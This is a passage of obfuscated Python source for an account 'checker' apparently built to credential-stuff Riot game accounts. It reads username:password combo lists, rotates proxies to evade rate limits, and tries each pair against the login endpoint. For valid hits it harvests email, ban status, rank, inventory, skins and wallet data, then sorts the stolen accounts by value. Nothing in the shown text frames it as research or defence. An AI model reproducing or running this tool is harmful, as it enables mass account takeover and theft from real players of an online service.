        OO0O0O00OOOOOO0O0._["combo_file_name"] = O0OOO000O000O0O00  # line:1070
        if O0OOO000O000O0O00 is None:  # line:1072
            OO0O0O00OOOOOO0O0.log(f"Please select a valid combo file")  # line:1073
            time.sleep(2)  # line:1074
            OO0O0O00OOOOOO0O0.load_combos()  # line:1075
        else:  # line:1076
            try:  # line:1077
                with open(O0OOO000O000O0O00.name, "r+", encoding="utf-8",
                          errors="ignore")as OO0OOOOOOO0000O00:  # line:1078
                    OO00OO000O00OOO00 = OO0OOOOOOO0000O00.readlines()  # line:1079
                    for OO000O0OO00OOOO0O in OO00OO000O00OOO00:  # line:1080
                        try:  # line:1081
                            OO0O0O00OOOOOO0O0._["combos"].append(OO000O0OO00OOOO0O.replace("\n", ""))  # line:1082
                        except:  # line:1083
                            pass  # line:1084
                    OO0O0O00OOOOOO0O0.log(f"Loaded [{len(OO0O0O00OOOOOO0O0._['combos'])}] combos")  # line:1085
            except:  # line:1086
                OO0O0O00OOOOOO0O0.log(f"Your combo file is probably harmed, please try again..")  # line:1087
                time.sleep(2)  # line:1088
                OO0O0O00OOOOOO0O0.load_combos()  # line:1089
        if OO0O0O00OOOOOO0O0._["remove_double_lines"]:  # line:1091
            OO0O0O00OOOOOO0O0.remove_double_combos()  # line:1092
        OO0O0O00OOOOOO0O0._["len_combos"] = len(OO0O0O00OOOOOO0O0._["combos"])  # line:1094

    def load_proxies(O0OO0O0000OO00000):  # line:1096
        O0OO0O0000OO00000.cls()  # line:1097
        print(O0OO0O0000OO00000._["logo"])  # line:1098
        print()  # line:1099
        O0OO0O0000OO00000.log("Please select your proxies [ONLY HTTP/S]")  # line:1100
        OO00OOOO000O00O00 = filedialog.askopenfile(parent=O0OO0O0000OO00000._["root"], mode='rb',
                                                   title='Choose a proxy file',
                                                   filetype=(("txt", "*.txt"), ("All files", "*.txt")))  # line:1103
        O0OO0O0000OO00000._["proxy_file_name"] = OO00OOOO000O00O00  # line:1105
        if OO00OOOO000O00O00 is None:  # line:1107
            O0OO0O0000OO00000.log(f"Please select a valid proxy file")  # line:1108
            time.sleep(2)  # line:1109
            O0OO0O0000OO00000.load_proxies()  # line:1110
        else:  # line:1111
            try:  # line:1112
                with open(OO00OOOO000O00O00.name, "r+", encoding="utf-8",
                          errors="ignore")as O0OO0000000OO0000:  # line:1113
                    OOO0O0O0O00000OO0 = O0OO0000000OO0000.readlines()  # line:1114
                    for O0O0O0OO000O0O0O0 in OOO0O0O0O00000OO0:  # line:1115
                        try:  # line:1116
                            O0OO0O0000OO00000._["proxies"]["all"].append(
                                O0O0O0OO000O0O0O0.split()[0].replace("\n", ""))  # line:1118
                        except:  # line:1119
                            pass  # line:1120
                    O0OO0O0000OO00000.log(f"Loaded [{len(O0OO0O0000OO00000._['proxies']['all'])}] proxies")  # line:1122
            except:  # line:1123
                O0OO0O0000OO00000.log(f"Your proxy file is probably harmed, please try again..")  # line:1124
                time.sleep(2)  # line:1125
                O0OO0O0000OO00000.load_combos()  # line:1126

    def create_session(OOO0OO0OOO000OO00):  # line:1128
        return aiohttp.ClientSession(
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                     "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/json"})  # line:1134

    async def create_parent_session(O00OOOO0OOO000O00):  # line:1136
        O00OOOO0OOO000O00._["parent_session"] = aiohttp.ClientSession(
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                     "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/json"})  # line:1142

    async def load_api_data(OOO00O000O0O0OOOO):  # line:1144
        OOO00O000O0O0OOOO._["api_data"]["skins"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["skins"])).json())[
            "data"]  # line:1146
        OOO00O000O0O0OOOO._["api_data"]["agents"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["agents"])).json())[
            "data"]  # line:1147
        OOO00O000O0O0OOOO._["api_data"]["sprays"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["sprays"])).json())[
            "data"]  # line:1148
        OOO00O000O0O0OOOO._["api_data"]["contracts"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["contracts"])).json())[
            "data"]  # line:1149
        OOO00O000O0O0OOOO._["api_data"]["buddies"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["buddies"])).json())[
            "data"]  # line:1150
        OOO00O000O0O0OOOO._["api_data"]["cards"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["cards"])).json())[
            "data"]  # line:1151
        OOO00O000O0O0OOOO._["api_data"]["titles"] = \
        (await (await OOO00O000O0O0OOOO._["parent_session"].get(OOO00O000O0O0OOOO._["endpoints"]["titles"])).json())[
            "data"]  # line:1152

    async def load_currency_data(O000O00O000OO00OO):  # line:1154
        O000O00O000OO00OO._["api_data"]["currency"] = (await (
            await O000O00O000OO00OO._["parent_session"].get(O000O00O000OO00OO._["endpoints"]["currency_data"])).json())[
            "data"]  # line:1155

    async def load_client_version(OOOO0OOOOOOO0OOO0):  # line:1157
        OOOO0OOOOOOO0OOO0._["api_data"]["client_version"] = (await (await OOOO0OOOOOOO0OOO0._["parent_session"].get(
            OOOO0OOOOOOO0OOO0._["endpoints"]["client_version"])).json())["data"]  # line:1158

    async def generate_session_id(OO0O0000OOOO000OO, OOOOOO0OOOOOOOOOO, O00000OOO0000O000):  # line:1160
        return await OOOOOO0OOOOOOOOOO.post(OO0O0000OOOO000OO._['endpoints']['authorization'],
                                            json={"Content-Type": "application/json", "acr_values": "claims",
                                                  "code_challenge": "", "code_challenge_method": "",
                                                  "client_id": "riot-client", "nonce": "oYnVwCSrlS5IHKh7iI17oQ",
                                                  "redirect_uri": "http://localhost/redirect",
                                                  "response_type": "token id_token",
                                                  "scope": "account openid link ban lol_region", },
                                            timeout=OO0O0000OOOO000OO._["timeout"], proxy=O00000OOO0000O000["url"],
                                            proxy_auth=O00000OOO0000O000["proxy_auth"])  # line:1171

    async def check_combo(O0OO0OOOO0O00OO00, O0OOOO0OO0OOOO00O, O00OO00O000OO00O0, OO0OO000OOOOO0O0O):  # line:1173
        return await O0OOOO0OO0OOOO00O.put(O0OO0OOOO0O00OO00._['endpoints']['authorization'],
                                           json={"Content-Type": "application/json", 'type': 'auth',
                                                 'username': OO0OO000OOOOO0O0O["username"],
                                                 'password': OO0OO000OOOOO0O0O["password"]},
                                           timeout=O0OO0OOOO0O00OO00._["timeout"], proxy=O00OO00O000OO00O0["url"],
                                           proxy_auth=O00OO00O000OO00O0["proxy_auth"])  # line:1179

    def convert_proxy(OO000O0OOO000OO00, OOOO0000OO00OOOOO):  # line:1181
        return f'{OO000O0OOO000OO00._["proxy_types"][OO000O0OOO000OO00._["proxy_type"]]}://{OOOO0000OO00OOOOO}'  # line:1182

    def reconvert_proxy(OO0OO00OO0O0OO00O, OO0O0O0OOOO0O00O0):  # line:1184
        return OO0O0O0OOOO0O00O0["url"].split("://")[1]  # line:1185

    def proxy(O0000O0OO0O00O00O):  # line:1187
        try:  # line:1188
            OOO000OO0O0O0OO00 = random.choice(O0000O0OO0O00O00O._["proxies"]["all"])  # line:1189
            O0OO00OOO0000O0O0 = False  # line:1190
            if len(OOO000OO0O0O0OO00.split(":")) > 2:  # line:1192
                O0OO00OOO0000O0O0 = True  # line:1193
            if O0OO00OOO0000O0O0:  # line:1195
                OO0O000O00OOO00OO = {
                    "url": f'{O0000O0OO0O00O00O._["proxy_types"][O0000O0OO0O00O00O._["proxy_type"]]}://{OOO000OO0O0O0OO00.split(":")[0] + ":" + OOO000OO0O0O0OO00.split(":")[1]}',
                    "proxy_auth": aiohttp.BasicAuth(OOO000OO0O0O0OO00.split(":")[2], OOO000OO0O0O0OO00.split(":")[3]),
                    "requires_auth": O0OO00OOO0000O0O0}  # line:1200
            else:  # line:1201
                OO0O000O00OOO00OO = {
                    "url": f'{O0000O0OO0O00O00O._["proxy_types"][O0000O0OO0O00O00O._["proxy_type"]]}://{OOO000OO0O0O0OO00.split(":")[0] + ":" + OOO000OO0O0O0OO00.split(":")[1]}',
                    "proxy_auth": None, "requires_auth": O0OO00OOO0000O0O0}  # line:1206
            return OO0O000O00OOO00OO  # line:1208
        except:  # line:1209
            time.sleep(random.randint(1, (int(O0000O0OO0O00O00O._["threads"]) / 10)))  # line:1210
            return O0000O0OO0O00O00O.proxy()  # line:1211

    async def convert_req_to_json(OO0000OO0OOOOOOOO, O0O0000OOO000OO00):  # line:1213
        O000OOOOO0O0O0O0O = await O0O0000OOO000OO00.text()  # line:1214
        try:  # line:1216
            return json.loads(O000OOOOO0O0O0O0O)  # line:1217
        except:  # line:1218
            pass  # line:1219

    def get_item_name(O0OO00000OO000000, O0OO000O00O0O0O0O, _O000OO000OO00OO00):  # line:1221
        O0O00O000O0OOOO0O = None  # line:1222
        for O0OOOOOO0OO00O00O in O0OO00000OO000000._["api_data"][_O000OO000OO00OO00]:  # line:1224
            if O0OOOOOO0OO00O00O["uuid"] == O0OO000O00O0O0O0O:  # line:1225
                O0O00O000O0OOOO0O = O0OOOOOO0OO00O00O["displayName"]  # line:1226
                break  # line:1227
        return O0O00O000O0OOOO0O  # line:1229

    def get_buddie_name(O0O0O00000O0O0OOO, OO0000O000OO0OO00):  # line:1231
        O00O00O0O0OOO00OO = None  # line:1232
        for O00OO00O00O0OO0O0 in O0O0O00000O0O0OOO._["api_data"]["buddies"]:  # line:1234
            for OO0OO000O0OOO0O0O in O00OO00O00O0OO0O0["levels"]:  # line:1235
                if OO0OO000O0OOO0O0O["uuid"] == OO0000O000OO0OO00:  # line:1236
                    O00O00O0O0OOO00OO = OO0OO000O0OOO0O0O["displayName"]  # line:1237
                    break  # line:1238
        return O00O00O0O0OOO00OO  # line:1240

    def get_skin_name(OO00O000O0OO0O00O, OOOO000O00000OOOO):  # line:1242
        OO00OO00OOO00OO00 = None  # line:1243
        for OOO000OO0O0O00O0O in OO00O000O0OO0O00O._["api_data"]["skins"]:  # line:1245
            for O0O0000O00O000OO0 in OOO000OO0O0O00O0O["levels"]:  # line:1246
                if O0O0000O00O000OO0["uuid"] == OOOO000O00000OOOO:  # line:1247
                    OO00OO00OOO00OO00 = O0O0000O00O000OO0["displayName"]  # line:1248
                    break  # line:1249
        return OO00OO00OOO00OO00  # line:1251

    def get_skin_variant_name(OOO00OO000OOO0O00, O0O00O0O0OO0O0000):  # line:1253
        OOOOO0O0OO00O0O0O = None  # line:1254
        for OO000OO0OOO00OO0O in OOO00OO000OOO0O00._["api_data"]["skins"]:  # line:1256
            for OO0O000O0OO0000O0 in OO000OO0OOO00OO0O["chromas"]:  # line:1257
                if OO0O000O0OO0000O0["uuid"] == O0O00O0O0OO0O0000:  # line:1258
                    OOOOO0O0OO00O0O0O = OO0O000O0OO0000O0["displayName"]  # line:1259
                    break  # line:1260
        return OOOOO0O0OO00O0O0O  # line:1262

    def stats_ui(OOO000O000000OO00):  # line:1264
        if OOO000O000000OO00._["ui"] == "CUI":  # line:1265
            if not OOO000O000000OO00._["checker_finished"]:  # line:1266
                OOO000O000000OO00.cls()  # line:1267
                print(OOO000O000000OO00._["logo"])  # line:1268
                print()  # line:1269
                OOO000O000000OO00.log(f"Captured: {OOO000O000000OO00._['stats']['captured']}", "STATS")  # line:1270
                OOO000O000000OO00.log(f"Valids: {OOO000O000000OO00._['stats']['valid']}", "STATS")  # line:1271
                OOO000O000000OO00.log(f"Invalids: {OOO000O000000OO00._['stats']['invalid']}", "STATS")  # line:1272
                OOO000O000000OO00.log(f"Banned: {OOO000O000000OO00._['stats']['banned']}", "STATS")  # line:1273
                OOO000O000000OO00.log(f"Retries: {OOO000O000000OO00._['stats']['retries']}", "STATS")  # line:1274
                OOO000O000000OO00.log(f"Errors: {OOO000O000000OO00._['stats']['errors']}", "STATS")  # line:1275
                OOO000O000000OO00.log(f"Unknown: {OOO000O000000OO00._['stats']['unknown']}", "STATS")  # line:1276
                OOO000O000000OO00.log(f"Rate limited: {OOO000O000000OO00._['stats']['rate_limited']}",
                                      "STATS")  # line:1278
                OOO000O000000OO00.log(f"Remaining combos: {len(OOO000O000000OO00._['combos'])}", "STATS")  # line:1280
                OOO000O000000OO00.log(f"Combos in beginning: {OOO000O000000OO00._['len_combos']}", "STATS")  # line:1282
                OOO000O000000OO00.log("", "STATS")  # line:1284
                OOO000O000000OO00.log(
                    f"Captured User Info: {len(OOO000O000000OO00._['stats']['_captured']['user_info'])}",
                    "STATS")  # line:1286
                OOO000O000000OO00.log(
                    f"Captured Inventory: {len(OOO000O000000OO00._['stats']['_captured']['inventory'])}",
                    "STATS")  # line:1288
                OOO000O000000OO00.log(f"Captured Rank: {len(OOO000O000000OO00._['stats']['_captured']['rank'])}",
                                      "STATS")  # line:1290
                OOO000O000000OO00.log(f"Captured Wallet: {len(OOO000O000000OO00._['stats']['_captured']['wallet'])}",
                                      "STATS")  # line:1292
                OOO000O000000OO00.log(
                    f"Captured Full: {len(OOO000O000000OO00._['stats']['_captured']['full_capture'])}",
                    "STATS")  # line:1294
                OOO000O000000OO00.log("", "STATS")  # line:1296
                OOO000O000000OO00.log("[EU/NA/AP/KR] Skins:", "STATS")  # line:1297
                for _O0OO0O0OOOO0O00OO in OOO000O000000OO00._["filter"]["skins"]:  # line:1298
                    OOO000O000000OO00.log(
                        f'[{_O0OO0O0OOOO0O00OO}]: {len(OOO000O000000OO00._["filter"]["skins"][_O0OO0O0OOOO0O00OO])}',
                        "STATS")  # line:1300
                OOO000O000000OO00.log("", "STATS")  # line:1302
                OOO000O000000OO00.log("[EU/NA/AP/KR] Ranks:", "STATS")  # line:1303
                for _OOOO00OO0O000O00O in OOO000O000000OO00._["filter"]["ranks"]:  # line:1304
                    OOO000O000000OO00.log(
                        f'[{_OOOO00OO0O000O00O.capitalize()}]: {len(OOO000O000000OO00._["filter"]["ranks"][_OOOO00OO0O000O00O])}',
                        "STATS")  # line:1306

    def add_inventory_type(OO00000O00O00O000, O00O0O00O0O0O0OOO, OO00O00OO00000O0O, OO000OO000O00O0OO,
                           O0O0000O000OO0O00, OOO0O0000O0OO0OO0=None):  # line:1308
        OO0O000000OO0OO00 = OO00O00OO00000O0O  # line:1309
        if OOO0O0000O0OO0OO0:  # line:1311
            OO0O000000OO0OO00 += f"\n| Account Level: {OOO0O0000O0OO0OO0}"  # line:1312
        OO0O000000OO0OO00 += f"\n|-------------[{O0O0000O000OO0O00.upper()}]-------------"  # line:1314
        OO0O000000OO0OO00 += f"\n|-----------[{O00O0O00O0O0O0OOO}({len(OO000OO000O00O0OO)})]-----------"  # line:1315
        for OOOOO0O00O00O00O0 in OO000OO000O00O0OO:  # line:1317
            OO0O000000OO0OO00 += f"\n| {OOOOO0O00O00O00O0}"  # line:1318
        return OO0O000000OO0OO00  # line:1320

    def add_data(OO0O0OOO000O0OO0O, OOO000O0OO0OOO00O, O000OOO0000OOO00O):  # line:1322
        OO000OOOO00OO0000 = OOO000O0OO0OOO00O  # line:1323
        for OO0OOO000OOO000O0 in O000OOO0000OOO00O:  # line:1325
            OO000OOOO00OO0000 += f"\n| {OO0OOO000OOO000O0}: {O000OOO0000OOO00O[OO0OOO000OOO000O0]}"  # line:1326
        return OO000OOOO00OO0000  # line:1328

    def cls(O0OOOOO00O00OOOOO):  # line:1330
        os.system('cls' if os.name == 'nt' else 'clear')  # line:1331

    def get_raw_combo(O0O0000OO0OO0OO00, OOOO000OOOOO0O00O):  # line:1333
        return f"{OOOO000OOOOO0O00O['username']}:{OOOO000OOOOO0O00O['password']}"  # line:1334

    def filter_rank(O0OO0OOO000O0O000, O00OOOO000OO0000O, O00OO000O000OO0O0, OO0OOO000000OO0OO):  # line:1336
        O00OOOO000OO0000O = O00OOOO000OO0000O.lower()  # line:1337
        if "unranked" in O00OOOO000OO0000O:  # line:1339
            O0OO0OOO000O0O000._["filter"]["ranks"]["unranked"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1341
        elif "unknown" in O00OOOO000OO0000O:  # line:1342
            O0OO0OOO000O0O000._["filter"]["ranks"]["unknown"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1344
        elif "iron" in O00OOOO000OO0000O:  # line:1345
            O0OO0OOO000O0O000._["filter"]["ranks"]["iron"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1347
        elif "bronze" in O00OOOO000OO0000O:  # line:1348
            O0OO0OOO000O0O000._["filter"]["ranks"]["bronze"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1350
        elif "silver" in O00OOOO000OO0000O:  # line:1351
            O0OO0OOO000O0O000._["filter"]["ranks"]["silver"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1353
        elif "gold" in O00OOOO000OO0000O:  # line:1354
            O0OO0OOO000O0O000._["filter"]["ranks"]["gold"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1356
        elif "platinum" in O00OOOO000OO0000O:  # line:1357
            O0OO0OOO000O0O000._["filter"]["ranks"]["platinum"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1359
        elif "diamond" in O00OOOO000OO0000O:  # line:1360
            O0OO0OOO000O0O000._["filter"]["ranks"]["diamond"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1362
        elif "immortal" in O00OOOO000OO0000O:  # line:1363
            O0OO0OOO000O0O000._["filter"]["ranks"]["immortal"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1365
        elif "radiant" in O00OOOO000OO0000O:  # line:1366
            O0OO0OOO000O0O000._["filter"]["ranks"]["radiant"].append(
                {"capture": OO0OOO000000OO0OO, "region": O00OO000O000OO0O0})  # line:1368

    def filter_skins(O0OO000000OOO0O00, OOOO00OOO0O00O000, O0000O000000O00O0, OOO000O0OO00O0O0O):  # line:1370
        if OOOO00OOO0O00O000 == 0:  # line:1371
            O0OO000000OOO0O00._["filter"]["skins"]["0"].append(
                {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1373
        else:  # line:1374
            if OOOO00OOO0O00O000 > 1 and OOOO00OOO0O00O000 <= 10:  # line:1375
                O0OO000000OOO0O00._["filter"]["skins"]["1-10"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1377
            elif OOOO00OOO0O00O000 > 10 and OOOO00OOO0O00O000 <= 20:  # line:1378
                O0OO000000OOO0O00._["filter"]["skins"]["10-20"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1380
            elif OOOO00OOO0O00O000 > 20 and OOOO00OOO0O00O000 <= 30:  # line:1381
                O0OO000000OOO0O00._["filter"]["skins"]["20-30"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1383
            elif OOOO00OOO0O00O000 > 30 and OOOO00OOO0O00O000 <= 40:  # line:1384
                O0OO000000OOO0O00._["filter"]["skins"]["30-40"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1386
            elif OOOO00OOO0O00O000 > 40 and OOOO00OOO0O00O000 <= 50:  # line:1387
                O0OO000000OOO0O00._["filter"]["skins"]["40-50"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1389
            elif OOOO00OOO0O00O000 > 40 and OOOO00OOO0O00O000 <= 50:  # line:1390
                O0OO000000OOO0O00._["filter"]["skins"]["50-80"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1392
            elif OOOO00OOO0O00O000 > 50 and OOOO00OOO0O00O000 <= 80:  # line:1393
                O0OO000000OOO0O00._["filter"]["skins"]["80-100"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1395
            elif OOOO00OOO0O00O000 > 80 and OOOO00OOO0O00O000 <= 100:  # line:1396
                O0OO000000OOO0O00._["filter"]["skins"]["100-150"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1398
            elif OOOO00OOO0O00O000 > 150 and OOOO00OOO0O00O000 <= 200:  # line:1399
                O0OO000000OOO0O00._["filter"]["skins"]["150-200"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1401
            elif OOOO00OOO0O00O000 > 200:  # line:1402
                O0OO000000OOO0O00._["filter"]["skins"]["200+"].append(
                    {"capture": OOO000O0OO00O0O0O, "region": O0000O000000O00O0})  # line:1404

    async def capture(O000O0O00OO0O0O0O, OOO0O0OOO00O0OOOO, OOO0000000OOOOO00, O0OO0OOOO0000O0O0,
                      O0O0O0O0O000O0000):  # line:1406
        OOOOOOO00OOOOOOO0 = str(O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00))  # line:1407
        O000O0O00OO0O0O0O.log(f"Capturing {OOOOOOO00OOOOOOO0}", O0O0O0O0O000O0000)  # line:1408
        if O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00) not in O000O0O00OO0O0O0O._["stats"][
            "valids"]:  # line:1410
            O000O0O00OO0O0O0O._["stats"]["save"]["valids_raw"] += f"{OOOOOOO00OOOOOOO0}\n"  # line:1412
            O000O0O00OO0O0O0O._["stats"]["valid"] += 1  # line:1413
            O000O0O00OO0O0O0O._["stats"]["valids"].append(OOOOOOO00OOOOOOO0)  # line:1414
            O000O0O00OO0O0O0O.save_stats()  # line:1415
        if O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00) not in O000O0O00OO0O0O0O._['stats']['_captured'][
            'full_capture']:  # line:1417
            try:  # line:1418
                O00000O0O0O0OOOO0 = []  # line:1419
                OO000O0O0000OO0OO = {}  # line:1420
                async with aiohttp.request("POST", O000O0O00OO0O0O0O._["endpoints"]['user_info'],
                                           timeout=aiohttp.ClientTimeout(total=O000O0O00OO0O0O0O._["timeout"],
                                                                         sock_connect=O000O0O00OO0O0O0O._["timeout"],
                                                                         sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                           headers={"Content-Type": "application/json",
                                                    "Authorization": f"Bearer {O0OO0OOOO0000O0O0}"},
                                           proxy=OOO0O0OOO00O0OOOO["url"],
                                           proxy_auth=OOO0O0OOO00O0OOOO["proxy_auth"])as OO00O00O0000O0O0O:  # line:1424
                    O000OO0OOO0O00OO0 = await OO00O00O0000O0O0O.text()  # line:1426
                    OO00O00O0000O0O0O = await O000O0O00OO0O0O0O.convert_req_to_json(OO00O00O0000O0O0O)  # line:1427

                def O00O0000OOOO00OOO(O0O00OO00000O00O0):  # line:1429
                    OOO0O000OOOOO0000 = False  # line:1430
                    for O0000OOOOOO00000O in ["AC_SCRIPTING_PERMANENT", "PERMANENT_BAN", "ares", "PERMA_BAN",
                                              "Player banned"]:  # line:1432
                        if O0000OOOOOO00000O in O0O00OO00000O00O0:  # line:1433
                            OOO0O000OOOOO0000 = True  # line:1434
                            break  # line:1435
                    if OOO0O000OOOOO0000:  # line:1437
                        O000O0O00OO0O0O0O._["stats"]["banned"] += 1  # line:1438
                    return OOO0O000OOOOO0000  # line:1440

                OO000O0O0000OO0OO["Banned"] = O00O0000OOOO00OOO(O000OO0OOO0O00OO0)  # line:1442

                def OO0O0O0O0OOOOO00O(O0OOOOOOOOOOO0OOO):  # line:1444
                    OOO000OO0000OOOO0 = {"BR1": "BR", "EUN1": "EUN", "EUW1": "EUW", "JP1": "JP", "KR": "KR",
                                         "LA1": "LAN", "LA2": "LAS", "NA1": "NA", "OC1": "OCE", "PBE1": "PBE",
                                         "RU": "RU", "TR1": "TR"}  # line:1458
                    try:  # line:1460
                        return OOO000OO0000OOOO0[O0OOOOOOOOOOO0OOO]  # line:1461
                    except:  # line:1462
                        return O0OOOOOOOOOOO0OOO  # line:1463

                def O00OOOOOO0O0O000O(O0OOO0O0O00O0OOO0):  # line:1465
                    O00O00000OOO0OO0O = {"BR": "na", "EUN": "eu", "EUW": "eu", "JP": "ap", "KR": "kr", "LAN": "na",
                                         "LAS": "na", "NA": "na", "OCE": "ap", "PBE": "na", "RU": "eu",
                                         "TR": "eu"}  # line:1479
                    try:  # line:1481
                        return O00O00000OOO0OO0O[O0OOO0O0O00O0OOO0]  # line:1482
                    except:  # line:1483
                        return None  # line:1484

                try:  # line:1486
                    OO00O0O0OO0000O0O = OO0O0O0O0OOOOO00O(OO00O00O0000O0O0O["original_platform_id"])  # line:1487
                    O0OO0O00000O0O0O0 = O00OOOOOO0O0O000O(OO00O0O0OO0000O0O)  # line:1488
                    if O0OO0O00000O0O0O0:  # line:1490
                        OO000O0O0000OO0OO["Region"] = O0OO0O00000O0O0O0.upper()  # line:1491
                        for _O0O0O0000O0OOO0O0 in O000O0O00OO0O0O0O._["regions"]:  # line:1492
                            if _O0O0O0000O0OOO0O0 != O0OO0O00000O0O0O0:  # line:1493
                                O00000O0O0O0OOOO0.append(_O0O0O0000O0OOO0O0)  # line:1494
                except:  # line:1496
                    if dont_log_errors == False:  # line:1497
                        print(traceback.format_exc())  # line:1498
                    O000O0O00OO0O0O0O._["errors"].append(traceback.format_exc())  # line:1499
                async with aiohttp.request("POST", O000O0O00OO0O0O0O._["endpoints"]['token'],
                                           timeout=aiohttp.ClientTimeout(total=O000O0O00OO0O0O0O._["timeout"],
                                                                         sock_connect=O000O0O00OO0O0O0O._["timeout"],
                                                                         sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                           headers={"Content-Type": "application/json",
                                                    "Authorization": f"Bearer {O0OO0OOOO0000O0O0}"},
                                           proxy=OOO0O0OOO00O0OOOO["url"],
                                           proxy_auth=OOO0O0OOO00O0OOOO["proxy_auth"])as O0O0OO00OO0OO0O0O:  # line:1503
                    O0O0OO00OO0OO0O0O = (await O000O0O00OO0O0O0O.convert_req_to_json(O0O0OO00OO0OO0O0O))[
                        "entitlements_token"]  # line:1504

                async def OO00000O0OO0000OO(OO000O00O000O0O0O, OOOOO0OOOO00OO0OO, OO000OOO00000O000):  # line:1506
                    async with aiohttp.request("GET", O000O0O00OO0O0O0O._["endpoints"]["email_verification"],
                                               timeout=aiohttp.ClientTimeout(total=O000O0O00OO0O0O0O._["timeout"],
                                                                             sock_connect=O000O0O00OO0O0O0O._[
                                                                                 "timeout"],
                                                                             sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                               headers={"Content-Type": "application/json",
                                                        "Authorization": f"Bearer {OOOOO0OOOO00OO0OO}",
                                                        "X-Riot-Entitlements-JWT": OO000OOO00000O000, },
                                               proxy=OO000O00O000O0O0O["url"], proxy_auth=OO000O00O000O0O0O[
                                "proxy_auth"])as O00OO00O000OOO0O0:  # line:1511
                        OOO000O00OOO00O0O = (
                            await O000O0O00OO0O0O0O.convert_req_to_json(O00OO00O000OOO0O0))  # line:1512
                    return OOO000O00OOO00O0O  # line:1514

                OOO0O00O000000OO0 = (
                    await OO00000O0OO0000OO(OOO0O0OOO00O0OOOO, O0OO0OOOO0000O0O0, O0O0OO00OO0OO0O0O))  # line:1516
                OO000O0O0000OO0OO["E-Mail"] = OOO0O00O000000OO0.get("email", "Unknown")  # line:1518
                OO000O0O0000OO0OO["E-Mail Verified"] = OOO0O00O000000OO0.get("emailVerified", "Unknown")  # line:1519
                OOO0O00O00O0OOOO0 = OO00O00O0000O0O0O["sub"]  # line:1521
                O0O00O0OO00O0OOOO = O000O0O00OO0O0O0O.raw_user_info(OO00O00O0000O0O0O, OOO0000000OOOOO00,
                                                                    OO000O0O0000OO0OO)  # line:1524
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["user_info"]:  # line:1526
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "user_info"] += f"{O0O00O0OO00O0OOOO}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1528
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["user_info"].append(OOOOOOO00OOOOOOO0)  # line:1529

                async def OOO00OO0000000O00(OO0O00O00OO0O0000, O000O0O0OOOOO0O00, O0OO00OOO00000OOO, O00OO0O0OO00O00OO,
                                            OOOO00O000OO0O0O0):  # line:1531
                    OO0O0OOOOO0OOO0O0 = {}  # line:1532
                    for O00000O00O0000OOO in O000O0O00OO0O0O0O._["regions"]:  # line:1534
                        if O00000O00O0000OOO not in OOOO00O000OO0O0O0:  # line:1535
                            async with aiohttp.request("GET", O000O0O00OO0O0O0O._["endpoints"]["entitlements"].format(
                                    O00000O00O0000OOO, O00OO0O0OO00O00OO), timeout=aiohttp.ClientTimeout(
                                    total=O000O0O00OO0O0O0O._["timeout"], sock_connect=O000O0O00OO0O0O0O._["timeout"],
                                    sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                                       headers={"Content-Type": "application/json",
                                                                "Authorization": f"Bearer {O000O0O0OOOOO0O00}",
                                                                "X-Riot-Entitlements-JWT": O0OO00OOO00000OOO,
                                                                "X-Riot-ClientVersion":
                                                                    O000O0O00OO0O0O0O._["api_data"]["client_version"][
                                                                        "riotClientVersion"],
